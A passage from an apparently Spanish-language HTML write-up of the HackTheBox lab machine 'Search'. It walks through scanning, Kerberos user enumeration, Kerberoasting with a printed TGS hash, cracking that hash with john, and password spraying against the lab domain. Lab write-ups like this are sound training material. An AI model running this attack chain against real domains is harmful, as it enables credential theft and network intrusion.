@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Search</title>
+
+  <meta name="description" content="Resolución de la máquina Search de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Search">
+  <meta name="twitter:description" content="Resolución de la máquina Search de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/search.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Search">
+  <meta property="og:description" content="Resolución de la máquina Search de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/search.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/search.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Search" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#access-hope.sharp">Access - hope.sharp</a></li>
+        <li><a href="#access-web_svc">Access - web_svc</a></li>
+        <li><a href="#access-edgar.jacobs">Access - edgar.jacobs</a></li>
+        <li><a href="#access-sierra.frye">Access - sierra.frye</a></li>
+        <li><a href="#shell-sierra.frye">Shell - sierra.frye</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+        <li><a href="#altern-administrator">Alternativa - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/search.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Search</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.11.129
+Nmap scan report for 10.10.11.129  
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+8172/tcp  open  unknown
+9389/tcp  open  adws
+49667/tcp open  unknown
+49691/tcp open  unknown
+49692/tcp open  unknown
+49714/tcp open  unknown
+49726/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos obtener información de la maquina asi como el <code class="language-plaintext highlighter-rouge">dominio</code> que es <code class="language-plaintext highlighter-rouge">search.htb</code> ademas del nombre que parece es <code class="language-plaintext highlighter-rouge">research</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.11.129
+</span><span class="az">SMB         </span><span class="p">10.10.11.129    445    RESEARCH         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para posibles proximos ataques o solo por comodidad agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> ademas el <code class="language-plaintext highlighter-rouge">nombre</code> de la máquina que es el DC como otro dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.11.129 search.htb research.search.htb"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En la página principal encontramos una <code class="language-plaintext highlighter-rouge">web</code> que no nos aporta demasiado</p>
+<a href="/htb/search/1.png" target="_blank"><div><p><img src="/htb/search/1.png"></p></div></a>
+
+<p class="plain-text">Fuzzeando un poco algunas rutas de posibles directorios con <code class="language-plaintext highlighter-rouge">wfuzz</code> no vemos nada realmente interesante mas que un <code class="language-plaintext highlighter-rouge">/staff</code> que devuelve un codigo de estado <code class="language-plaintext highlighter-rouge">403</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://search.htb/FUZZ --hc 404 -t 100  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://search.htb/FUZZ
+Total requests: 26584
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000002:   </span><span class="az">301</span><span class="p">        1 L      10 W       149 Ch      "images"
+000000009:   </span><span class="az">301</span><span class="p">        1 L      10 W       145 Ch      "js"
+000000015:   </span><span class="az">301</span><span class="p">        1 L      10 W       146 Ch      "css"
+000000267:   </span><span class="az">301</span><span class="p">        1 L      10 W       148 Ch      "fonts"
+000000352:   </span><span class="ro">403</span><span class="p">        29 L     92 W       1233 Ch     "staff"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Bajando un poco en la <code class="language-plaintext highlighter-rouge">pagina</code> principal encontramos un apartado que muestra mediante un slide diferentes <code class="language-plaintext highlighter-rouge">imagenes</code> y textos, algunos sobre Lorem Ipsum</p>
+<a href="/htb/search/2.png" target="_blank"><div><p><img src="/htb/search/2.png"></p></div></a>
+</section>
+<section class="post" id="access-hope.sharp">
+<br><h3 class="post-title">Access - hope.sharp</h3><br>
+
+<p class="plain-text">Mirando a fondo una de las imagenes podemos encontrar un tipo de <code class="language-plaintext highlighter-rouge">nota</code> donde se nos muestra una posible contraseña valida para el usuario <code class="language-plaintext highlighter-rouge">Hope.Sharp</code></p>
+<a href="/htb/search/3.png" target="_blank"><div><p><img src="/htb/search/3.png"></p></div></a>
+
+<p class="plain-text">Antes necesitamos saber el nombre del usuario <code class="language-plaintext highlighter-rouge">Hope Sharp</code>, asi que creamos un pequeño <code class="language-plaintext highlighter-rouge">diccionario</code> con los posibles nombres de usuario que podrian existir</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">users.txt  
+Hope
+Sharp
+HSharp
+HopeSharp
+H.Sharp
+Hope.S
+Hope.Sharp</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">kerbrute</code> para validar los usuarios en el archivo <code class="language-plaintext highlighter-rouge">users.txt</code>, en este caso el usuario valido es <code class="language-plaintext highlighter-rouge">Hope.Sharp</code> por lo que la sintaxis correcta es <code class="language-plaintext highlighter-rouge">Name.Surname</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ kerbrute </span><span class="p">userenum -d search.htb --dc research.search.htb users.txt  
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+>  Using KDC(s):
+>       research.search.htb:88
+
+</span><span class="ve">>  [+] VALID USERNAME:   Hope.Sharp@search.htb</span><span class="p">
+>  Done! Tested 7 usernames (1 valid) in 0.171 seconds</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora que sabemos el usuario podemos probar la contraseña, esta es <code class="language-plaintext highlighter-rouge">valida</code>, listando los recursos compartidos llama la atención el recurso <code class="language-plaintext highlighter-rouge">RedirectedFolders$</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.htb -u Hope.Sharp -p </span><span class="am">'IsolationIsKey?'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">search.htb\Hope.Sharp:IsolationIsKey?</span>
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb search.htb -u Hope.Sharp -p </span><span class="am">'IsolationIsKey?'</span><span class="p"> --shares
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">search.htb\Hope.Sharp:IsolationIsKey?
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">CertEnroll      READ            Active Directory Certificate Services share
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">helpdesk
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">IPC$            READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">NETLOGON        READ            Logon server share
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">RedirectedFolders$ READ,WRITE
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">SYSVOL          READ            Logon server share</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos al recurso con <code class="language-plaintext highlighter-rouge">smbclient</code> utilizando las credenciales de <code class="language-plaintext highlighter-rouge">Hope.Sharp</code> podemos ver varios directorios los cuales son diferentes nombres de <code class="language-plaintext highlighter-rouge">usuarios</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">search.htb/Hope.Sharp:</span><span class="am">'IsolationIsKey?'</span><span class="p">@research.search.htb  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# use RedirectedFolders$
+# ls
+drw-rw-rw-          0  Tue Jun 27 22:02:32 2023 .
+drw-rw-rw-          0  Tue Jun 27 22:02:32 2023 ..
+drw-rw-rw-          0  Tue Apr  7 14:12:58 2020 abril.suarez
+drw-rw-rw-          0  Fri Jul 31 09:11:32 2020 Angie.Duffy
+drw-rw-rw-          0  Fri Jul 31 08:35:32 2020 Antony.Russo
+drw-rw-rw-          0  Tue Apr  7 14:32:31 2020 belen.compton
+drw-rw-rw-          0  Fri Jul 31 08:37:36 2020 Cameron.Melendez
+drw-rw-rw-          0  Tue Apr  7 14:15:09 2020 chanel.bell
+drw-rw-rw-          0  Fri Jul 31 09:09:07 2020 Claudia.Pugh
+drw-rw-rw-          0  Fri Jul 31 08:02:04 2020 Cortez.Hickman
+drw-rw-rw-          0  Tue Apr  7 14:20:08 2020 dax.santiago
+drw-rw-rw-          0  Fri Jul 31 07:55:34 2020 Eddie.Stevens
+drw-rw-rw-          0  Thu Apr  9 16:04:11 2020 edgar.jacobs
+drw-rw-rw-          0  Fri Jul 31 08:39:50 2020 Edith.Walls
+drw-rw-rw-          0  Tue Apr  7 14:23:13 2020 eve.galvan
+drw-rw-rw-          0  Tue Apr  7 14:29:22 2020 frederick.cuevas
+drw-rw-rw-          0  Thu Apr  9 10:34:41 2020 hope.sharp
+drw-rw-rw-          0  Tue Apr  7 14:07:00 2020 jayla.roberts
+drw-rw-rw-          0  Fri Jul 31 09:01:06 2020 Jordan.Gregory
+drw-rw-rw-          0  Thu Apr  9 16:11:39 2020 payton.harmon
+drw-rw-rw-          0  Fri Jul 31 07:44:32 2020 Reginald.Morton
+drw-rw-rw-          0  Tue Apr  7 14:10:25 2020 santino.benjamin
+drw-rw-rw-          0  Fri Jul 31 08:21:42 2020 Savanah.Velazquez
+drw-rw-rw-          0  Wed Nov 17 20:01:45 2021 sierra.frye
+drw-rw-rw-          0  Thu Apr  9 16:14:26 2020 trace.ryan
+#</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="access-web_svc">
+<br><h3 class="post-title">Access - web_svc</h3><br>
+
+<p class="plain-text">Para poder continuar enumeraremos con <code class="language-plaintext highlighter-rouge">bloodhound</code> toda la posible información sobre el dominio autenticandonos como Hope.Sharp, esto nos creara un <code class="language-plaintext highlighter-rouge">zip</code> con ella</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ bloodhound-python</span><span class="p"> -u Hope.Sharp -p </span><span class="am">'IsolationIsKey?'</span><span class="p"> -c All -d search.htb -dc search.htb -ns 10.10.11.129 --zip  
+INFO: Found AD domain: search.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: search.htb
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 113 computers
+INFO: Connecting to LDAP server: search.htb
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 107 users
+INFO: Found 64 groups
+INFO: Found 6 gpos
+INFO: Found 27 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: Research.search.htb
+INFO: Done in 01M 10S
+INFO: Compressing output into 20230627221401_bloodhound.zip</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de subir el <code class="language-plaintext highlighter-rouge">zip</code> que nos crea <code class="language-plaintext highlighter-rouge">bloodhound</code> y listar los usuarios <code class="language-plaintext highlighter-rouge">kerberoasteables</code> nos encontramos con <code class="language-plaintext highlighter-rouge">web_svc</code> ademas del tipico krbtgt</p>
+<a href="/htb/search/4.png" target="_blank"><div><p><img src="/htb/search/4.png"></p></div></a>
+
+<p class="plain-text">Tenemos credenciales validas asi que con <code class="language-plaintext highlighter-rouge">GetUserSPNs</code> podemos explotarlo y obtener un <code class="language-plaintext highlighter-rouge">hash</code> correspondiente al servicio que corre el usuario <code class="language-plaintext highlighter-rouge">web_svc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-GetUserSPNs </span><span class="p">search.htb/Hope.Sharp:</span><span class="am">'IsolationIsKey?'</span><span class="p"> -request
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
+---------------------------------  -------  --------  --------------------------  ---------  ----------
+RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  &ltnever>               
+
+$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$cb8ef41e8071dd39f7d60ede0558eead$48cd26531a1f8fd5607272392160704993b52f428e75dd3a84f8df1a0e687b15214fadaa499628729ca02d6132bb37b05e37a5ffc0e77a34630afa25f2e8bfc74793c3ef93c2de79efb0d4e1fa003f6c7a47e3e18a6f52a93db7039c2fde7abc5db0fe2c69b65d1c93edbe4a52d8b2d799cac404d2e45fd319cf342f223b8f54f794fdd4b632bc39c695f9fceeb4166a1dc2f0b92bdd1e0a064951c729bab161a131af44389707622a3a126e2030c7f7bade0b97cea78012fd081d5a9ee3e25da65130612c94b2e1f96c7cccded7ba4dee2ae3236cdb47b905d68bf308deeaf20172458413637c3871ba03c006db3c36288cdde0156293bc48089b38febae9ef50f9b7713651501de5f4857b7b1a1cc88fdae0ae59f597572d033659ccc449fcf3ec087a4b1cb8e761a1f2db7a28d18ecaf8306c97be1ae9bd8b980790509bc127348ac8d97257d591085aae599f90294b0a93669493a99dcf35512d02dcd43d983116c27311496910e7d973852d8c4221ff8770321a224536528042754bf3732746c0c45eaf81d2ff8130fc58a2ee8e742ba23e1363a2979d35e111b6d23763c57243eda85aaa5f8c80e5d93395eff67dfc6d173563eaae8d2aa696e095c7d94b03aea071047feafcd649fe95d5e6aaf25ef6f2cc46f40cd4b60e23b180c8419ac9ca5df45e37ba1128d897e0c7cba4bca826f234809bd8f4ce0bddd3fd645cc3204cb42b98e9a71ea9a945354e2282d85ca9598e26c0bcc18d36a6724201ed9da04638c5cac0a9f5b6da3916bd5e727ad9a66d5a3adf56d9eab6db9f2db8db17e5df8606482db65b4a9cc793960eb8fd30baf9b145ecde4fad6eaebe524305bae36e52aa1c695ac38693a77db4e0f92f7a89330e0be4592e9f722f41f38770e03f7a61a014c14b5ed15bc54e350808ddb7133ec2fcd29178de8d42adbc29310a27e1c93a967754f67e928d85997dc64e2410bffea4e95725117a9d49d10a959b7261e2f046ef20dc76cadc321789e29e8b5c6c0791accfeef6e7c1f3ff869ac2836c3b96f7bdb73acc84d90ff406630d6520d326267f372b584abc3ed8daaea17ed4f227f73225ce387cd37c2ade4550b53fb8b661da511f1ea18572a600435dfca6ae73752163e0bac5ef1f1cf462e7272dd3ab17ae3236655d1d25c0edb88e1a20a30987aa5ca949f07a7148080da9f82486a6c9b790aa03e21ccb459a849086fc28506817e3f567d28f23374c605b674c9bd58e689052c12c5694c51671e880ec853a78f2988f0e7f61387aa95d3a85564890e46a0d3d821cf89615c349a89665d6aa8438a47d623693b0b69acb14b80e9a1e710b08ac1e807cc03df5d183ed88d3d5d909e9ce54e3e398bedee0ed9e437b60b66a2bd05f6764ac3e908665fdf1940ce819658ac18e0991d75898bfce3de217e1f6e7191005c00089971248e9f18359e0a099e9c25163e868110b635e4818b3  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al pasarle el hash a <code class="language-plaintext highlighter-rouge">john</code> podemos crackearlo y obtener la contraseña de <code class="language-plaintext highlighter-rouge">web_svc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">@3ONEmillionbaby</span><span class="p"> (</span><span class="am">?</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos comprobarla con <code class="language-plaintext highlighter-rouge">crackmapexec</code> pero esta credencial realmente no nos aporta nuevos <code class="language-plaintext highlighter-rouge">privilegios</code> o archivos en los recursos <code class="language-plaintext highlighter-rouge">smb</code> compartidos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.htb -u web_svc -p @3ONEmillionbaby
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">search.htb\web_svc:@3ONEmillionbaby</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="access-edgar.jacobs">
+<br><h3 class="post-title">Access - edgar.jacobs</h3><br>
+
+<p class="plain-text">Para crear un diccionario de todos los <code class="language-plaintext highlighter-rouge">usuarios</code> del dominio podemos obtenerlos mediante <code class="language-plaintext highlighter-rouge">rpc</code> y con expresiones regulares obtener obtener una lista, en total <code class="language-plaintext highlighter-rouge">105</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ rpcclient</span><span class="p"> -U </span><span class="am">'web_svc%@3ONEmillionbaby'</span><span class="p"> search.htb -c enumdomusers | </span><span class="ve">grep</span><span class="p"> -oP </span><span class="am">'\[\D*?\]'</span><span class="p"> | </span><span class="ve">tr</span><span class="p"> -d </span><span class="am">'[]'</span><span class="p"> > users.txt  
+
+</span><span class="ve">❯ wc</span><span class="p"> -l users.txt
+105 users.txt</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">kerbrute</code> podemos probar autenticaciones para todos ellos reutilizando la contraseña del usuario <code class="language-plaintext highlighter-rouge">web_svc</code>, el usuario <code class="language-plaintext highlighter-rouge">Edgar.Jacobs</code> reutiliza la contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ kerbrute </span><span class="p">passwordspray -d search.htb --dc research.search.htb users.txt @3ONEmillionbaby  
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+>  Using KDC(s):
+>  	research.search.htb:88
+</span><span class="ve">
+>  [+] VALID LOGIN:	 Edgar.Jacobs@search.htb:@3ONEmillionbaby
+>  [+] VALID LOGIN:	 web_svc@search.htb:@3ONEmillionbaby
+</span><span class="p">>  Done! Tested 105 logins (2 successes) in 2.310 seconds</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y tenemos los mismos privilegios en los recursos <code class="language-plaintext highlighter-rouge">SMB</code>, podriamos probar si ahora hay algo interesante en <code class="language-plaintext highlighter-rouge">RedirectedFolders$</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.htb -u Edgar.Jacobs -p @3ONEmillionbaby
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">search.htb\Edgar.Jacobs:@3ONEmillionbaby
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb search.htb -u Edgar.Jacobs -p @3ONEmillionbaby --shares
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">search.htb\Edgar.Jacobs:@3ONEmillionbaby 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">CertEnroll      READ            Active Directory Certificate Services share
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">helpdesk        READ            
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">IPC$            READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">RedirectedFolders$ READ,WRITE      
+</span><span class="az">SMB         </span><span class="p">search.htb      445    RESEARCH         </span><span class="am">SYSVOL          READ            Logon server share</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="access-sierra.frye">
+<br><h3 class="post-title">Access - sierra.frye</h3><br>
+
+<p class="plain-text">Nos conectamos y en el directorio <code class="language-plaintext highlighter-rouge">Desktop</code> del usuario <code class="language-plaintext highlighter-rouge">Edgar.Jacobs</code> encontramos un archivo de extensión <code class="language-plaintext highlighter-rouge">xlsx</code> que por el nombre parece ser de intentos de <code class="language-plaintext highlighter-rouge">phishing</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">search.htb/Edgar.Jacobs:@3ONEmillionbaby@research.search.htb  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# use RedirectedFolders$
+# cd Edgar.Jacobs
+# ls
+drw-rw-rw-          0  Thu Apr  9 16:04:11 2020 .
+drw-rw-rw-          0  Thu Apr  9 16:04:11 2020 ..
+drw-rw-rw-          0  Mon Aug 10 06:02:16 2020 Desktop
+drw-rw-rw-          0  Mon Aug 10 06:02:17 2020 Documents
+drw-rw-rw-          0  Mon Aug 10 06:02:17 2020 Downloads
+# cd Desktop
+# ls
+drw-rw-rw-          0  Mon Aug 10 06:02:16 2020 .
